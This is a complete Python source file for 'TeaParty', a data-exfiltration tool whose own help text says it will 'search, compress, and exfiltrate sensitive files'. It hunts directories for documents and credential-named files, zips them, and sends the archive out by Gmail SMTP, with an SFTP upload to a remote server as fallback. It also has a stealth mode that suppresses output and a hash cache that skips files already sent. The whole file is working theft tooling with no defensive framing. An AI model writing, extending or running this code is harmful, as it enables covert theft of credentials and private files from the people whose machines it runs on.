import os
import fnmatch
import smtplib
import ssl
import zipfile
import argparse
import sys
import hashlib
import json
import time
from tempfile import NamedTemporaryFile
from email.message import EmailMessage
from datetime import datetime

# Optional SFTP module (if available)
try:
    import paramiko

    def upload_sftp(local_file, host, port, user, password, remote_dir=""):
        try:
            transport = paramiko.Transport((host, port))
            transport.connect(username=user, password=password)
            sftp = paramiko.SFTPClient.from_transport(transport)

            if remote_dir:
                try:
                    sftp.chdir(remote_dir)
                except IOError:
                    sftp.mkdir(remote_dir)
                    sftp.chdir(remote_dir)

            filename = os.path.basename(local_file)
            destination = os.path.join(remote_dir, filename) if remote_dir else filename
            sftp.put(local_file, destination)
            sftp.close()
            transport.close()
            return True, f"File uploaded via SFTP to {host}:{destination}"
        except Exception as e:
            return False, f"SFTP upload failed: {str(e)}"
except ImportError:
    upload_sftp = None

# Dual logger for console and file
class TeeLogger:
    def __init__(self, log_file, quiet=False):
        self.terminal = sys.stdout
        self.log = open(log_file, "w", encoding="utf-8")
        self.quiet = quiet

    def write(self, message):
        if not self.quiet:
            self.terminal.write(message)
        self.log.write(message)

    def flush(self):
        if not self.quiet:
            self.terminal.flush()
        self.log.flush()

def show_banner():
    print(r"""
╔════════════════════════════════════════════╗
║                                            ║
║        ████████╗███████╗ █████╗            ║
║        ╚══██╔══╝██╔════╝██╔══██╗           ║
║           ██║   █████╗  ███████║           ║
║           ██║   ██╔══╝  ██╔══██║           ║
║           ██║   ███████╗██║  ██║           ║
║           ╚═╝   ╚══════╝╚═╝  ╚═╝           ║
║                                            ║
║        TeaParty  -  by  Lagash             ║
╚════════════════════════════════════════════╝
""")

def generate_log_path():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M")
    return os.path.abspath(f"TeaParty_Log_{timestamp}.txt")

def sha256_of_file(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for block in iter(lambda: f.read(4096), b""):
            h.update(block)
    return h.hexdigest()

def load_hash_cache():
    if os.path.exists("TeaParty_HashCache.json"):
        with open("TeaParty_HashCache.json", "r") as f:
            return set(json.load(f))
    return set()

def save_hash_cache(hash_set):
    with open("TeaParty_HashCache.json", "w") as f:
        json.dump(list(hash_set), f)

def is_excluded(name, exclusion_patterns):
    return any(fnmatch.fnmatch(name.lower(), pattern.lower()) for pattern in exclusion_patterns)

def matches(name, extensions, patterns):
    result = True
    if extensions:
        result = any(fnmatch.fnmatch(name.lower(), f"*{ext.lower()}") for ext in extensions)
    if patterns:
        result = result and any(fnmatch.fnmatch(name.lower(), pattern.lower()) for pattern in patterns)
    return result

def safe_input(prompt):
    value = input(prompt).strip()
    if value.lower() in ["exit", "quit", "q"]:
        print("⏹️ Exit requested. Closing TeaParty...")
        sys.exit(0)
    return value

def parse_args_interactive():
    show_banner()
    print("[*] Running in interactive mode...\n")

    search_type = int(safe_input("Search type (1=extension, 2=name, 3=both): "))
    extensions = safe_input("Extensions (e.g. .pdf,.docx), leave blank if not used: ")
    patterns = safe_input("Filename patterns (e.g. *cred*.txt), leave blank if not used: ")
    directory = safe_input("Root directory (default is current): ") or os.getcwd()
    recursive = safe_input("Recursive search? (1=yes, 0=no): ") or "1"
    exclude_dirs = safe_input("Directories to exclude (e.g. .git,node_modules): ")
    exclude_files = safe_input("Files to exclude (e.g. *.log,*.tmp): ")
    mail_auth = safe_input("Sender email and password (user:pass): ")
    recipients = safe_input("Recipient(s) separated by comma: ")
    zip_policy = safe_input("Keep ZIP after sending? (1=yes, 2=delete): ") or "1"
    debug_mode = safe_input("Enable debug mode? (y/n): ").lower() == "y"
    quiet_mode = safe_input("Enable stealth mode? (y/n): ").lower() == "y"
    use_sftp = safe_input("Enable SFTP if email fails? (y/n): ").lower() == "y"
    sftp_fallback_only = True

    sftp_host = sftp_user = sftp_pass = sftp_dir = ""
    sftp_port = 22
    if use_sftp:
        sftp_host = safe_input("SFTP Host: ")
        sftp_port = int(safe_input("SFTP Port (default 22): ") or "22")
        sftp_user = safe_input("SFTP Username: ")
        sftp_pass = safe_input("SFTP Password: ")
        sftp_dir = safe_input("Remote directory (optional): ")

    class Args: pass
    args = Args()
    args.s = search_type
    args.e = extensions
    args.p = patterns
    args.d = directory
    args.r = int(recursive)
    args.x = exclude_dirs
    args.xfile = exclude_files
    args.m = mail_auth
    args.to = recipients
    args.z = int(zip_policy)
    args.debug = debug_mode
    args.quiet = quiet_mode
    args.sftp = use_sftp
    args.sftp_fallback_only = sftp_fallback_only
    args.sftp_host = sftp_host
    args.sftp_port = sftp_port
    args.sftp_user = sftp_user
    args.sftp_pass = sftp_pass
    args.sftp_dir = sftp_dir
    return args

def parse_args():
    parser = argparse.ArgumentParser(description="TeaParty - Search, compress, and exfiltrate sensitive files.")
    parser.add_argument("-s", type=int, help="Search type: 1=extension, 2=name, 3=both")
    parser.add_argument("-e", type=str, help="Extensions (e.g. .pdf,.docx)")
    parser.add_argument("-p", type=str, help="Name patterns (e.g. *cred*.txt)")
    parser.add_argument("-d", type=str, help="Root directory to search")
    parser.add_argument("-r", type=int, help="Recursive: 1=yes, 0=no")
    parser.add_argument("-x", type=str, help="Directories to exclude")
    parser.add_argument("-xfile", type=str, help="Files to exclude")
    parser.add_argument("-m", type=str, help="Sender email and password (format: user:pass)")
    parser.add_argument("-to", type=str, help="Recipient email(s) separated by comma")
    parser.add_argument("-z", type=int, help="ZIP policy: 1=keep, 2=delete if sent")
    parser.add_argument("--debug", action="store_true", help="Enable debug log")
    parser.add_argument("--quiet", action="store_true", help="Stealth mode: suppress output")
    parser.add_argument("--sftp", action="store_true", help="Enable SFTP upload")
    parser.add_argument("--sftp-fallback-only", action="store_true", help="Use SFTP only if email fails")
    parser.add_argument("--sftp-host", type=str, help="SFTP server host")
    parser.add_argument("--sftp-port", type=int, default=22, help="SFTP port")
    parser.add_argument("--sftp-user", type=str, help="SFTP username")
    parser.add_argument("--sftp-pass", type=str, help="SFTP password")
    parser.add_argument("--sftp-dir", type=str, default="", help="Remote upload directory")

    args = parser.parse_args()
    if len(sys.argv) == 1:
        return parse_args_interactive()
    return args

def search_files(directory, extensions, patterns, exclude_dirs, exclude_files, recursive, hash_cache):
    found_files = []
    for root, dirs, files in os.walk(directory):
        if not recursive:
            dirs.clear()
        dirs[:] = [d for d in dirs if d not in exclude_dirs]
        for file in files:
            full_path = os.path.join(root, file)
            if is_excluded(file, exclude_files):
                continue
            if not matches(file, extensions, patterns):
                continue
            file_hash = sha256_of_file(full_path)
            if file_hash not in hash_cache:
                found_files.append((full_path, file_hash))
    return found_files

def create_log_txt(files, zip_name=None):
    temp_log = NamedTemporaryFile(delete=False, suffix=".txt", mode="w", encoding="utf-8")
    temp_log.write("List of files found by TeaParty:\n\n")
    for path, _ in files:
        temp_log.write(path + "\n")

    temp_log.write("\n---\n[INTEGRITY CHECK]\n")
    for path, _ in files:
        name = os.path.basename(path)
        hash_val = sha256_of_file(path)
        temp_log.write(f"SHA256({name}): {hash_val}\n")

    if zip_name and os.path.exists(zip_name):
        zip_hash = sha256_of_file(zip_name)
        temp_log.write(f"\nSHA256({os.path.basename(zip_name)}): {zip_hash}\n")

    temp_log.close()
    return temp_log.name

def compress_files(files, debug_log_path=None):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M")
    zip_name = f"TeaParty_Lagash_{timestamp}.zip"
    log_path = create_log_txt(files)

    with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as zipf:
        for path, _ in files:
            zipf.write(path, arcname=os.path.basename(path))
        zipf.write(log_path, arcname="log.txt")
        if debug_log_path and os.path.exists(debug_log_path):
            zipf.write(debug_log_path, arcname="TeaParty_DebugLog.txt")

    return zip_name

def send_email(zip_path, recipients, sender, password, smtp_server, smtp_port, retries=3):
    for attempt in range(1, retries + 1):
        try:
            msg = EmailMessage()
            msg["Subject"] = "TeaParty - Found files attached"
            msg["From"] = sender
            msg["To"] = ", ".join(recipients)
            msg.set_content("Attached is a ZIP file with the discovered files and log.")

            with open(zip_path, "rb") as f:
                content = f.read()
                msg.add_attachment(content,
                                   maintype="application",
                                   subtype="zip",
                                   filename=os.path.basename(zip_path))

            context = ssl.create_default_context()
            with smtplib.SMTP_SSL(smtp_server, smtp_port, context=context) as server:
                server.login(sender, password)
                server.send_message(msg)

            return True
        except Exception as e:
            print(f"[!] Attempt {attempt} failed: {e}")
            if attempt < retries:
                time.sleep(3)
    return False

def main():
    args = parse_args()
    debug_mode = args.debug
    quiet_mode = args.quiet

    if debug_mode:
        log_path = generate_log_path()
        sys.stdout = sys.stderr = TeeLogger(log_path, quiet=quiet_mode)
    else:
        log_path = None

    if not quiet_mode and len(sys.argv) > 1:
        show_banner()

    if not (args.m and args.to):
        print("[!] Missing required parameters. Use -h for help.")
        return

    extensions = args.e.split(",") if args.e else []
    patterns = args.p.split(",") if args.p else []
    exclude_dirs = args.x.split(",") if args.x else []
    exclude_files = args.xfile.split(",") if args.xfile else []
    search_path = args.d if args.d else os.getcwd()
    recursive = bool(args.r) if args.r is not None else True
    zip_policy = args.z if args.z in [1, 2] else 1

    if args.s == 1:
        patterns = []
    elif args.s == 2:
        extensions = []
    elif args.s != 3:
        print("[!] Invalid search type.")
        return

    if ":" not in args.m:
        print("[!] Invalid -m format. Use sender:password")
        return

    sender, password = args.m.split(":", 1)
    recipients = [d.strip() for d in args.to.split(",")]

    if not quiet_mode:
        print(f"\n[+] Searching files in: {search_path}")

    hash_cache = load_hash_cache()
    found = search_files(search_path, extensions, patterns, exclude_dirs, exclude_files, recursive, hash_cache)

    if not quiet_mode:
        print(f"[+] New files found: {len(found)}")
    if not found:
        print("[!] No new files found. Exiting.")
        return

    for path, _ in found:
        if not quiet_mode:
            print(path)

    zip_path = compress_files(found, debug_log_path=log_path)
    zip_hash = sha256_of_file(zip_path)

    if not quiet_mode:
        print(f"\n[+] ZIP created: {zip_path}")
        print(f"🔐 SHA256 of ZIP: {zip_hash}")

    success = send_email(zip_path, recipients, sender, password, "smtp.gmail.com", 465)

    if success:
        print("✅ Email sent successfully.")
        if zip_policy == 2:
            os.remove(zip_path)
            print(f"🗑️  ZIP deleted: {zip_path}")
        else:
            print(f"📂 ZIP retained at: {os.path.abspath(zip_path)}")
        for _, h in found:
            hash_cache.add(h)
        save_hash_cache(hash_cache)
    else:
        print(f"\n[!] ❌ Email delivery failed.")
        print(f"📂 ZIP retained at: {os.path.abspath(zip_path)}")

        if args.sftp and upload_sftp:
            if args.sftp_fallback_only:
                print("[*] Attempting SFTP upload as fallback...")

            ok, message = upload_sftp(
                zip_path,
                args.sftp_host,
                args.sftp_port,
                args.sftp_user,
                args.sftp_pass,
                args.sftp_dir,
            )
            print(message)

    if debug_mode:
        print(f"\n📄 Log saved to: {log_path}")

if __name__ == "__main__":
    main()

